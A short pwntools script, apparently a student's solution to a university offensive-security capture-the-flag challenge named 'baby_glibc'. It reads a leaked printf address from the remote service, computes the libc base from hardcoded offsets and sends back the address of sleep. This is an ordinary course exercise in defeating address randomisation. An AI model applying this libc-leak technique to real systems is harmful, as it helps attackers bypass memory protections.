from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "baby_glibc"
PORT = 1235
NETID = b"os2178"
LOCAL = False

if LOCAL:
	p = process(CHALLENGE)
else:
	p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
	p.recvuntil(b"NetID (something like abc123): ")
	p.sendline(NETID)
	p.recvuntil(b"written on a post-it note: ").decode()

#hex values for offset of printf and sleep
printfOffset = "0x606f0"
sleepOffset = "0xea570"

#grab printf address from output
printf = p.recvuntil(b"\n").strip()
#print(str(printf))

#flip for LSB conversion
printf = printf[::-1]
#print(str(printf))

#convert to hex
printf = "0x" + printf.hex()
#print(printf)

#find base address
baseAddress = hex(int(printf, 16) - int(printfOffset, 16))
#print(baseAddress)

#find sleep address
sleepAddress = hex(int(baseAddress, 16) + int(sleepOffset, 16))
#print(sleepAddress)

#go to last input
print(p.recvuntil(b"> ").decode())
p.sendline(sleepAddress)
print(p.recv())

p.interactive()

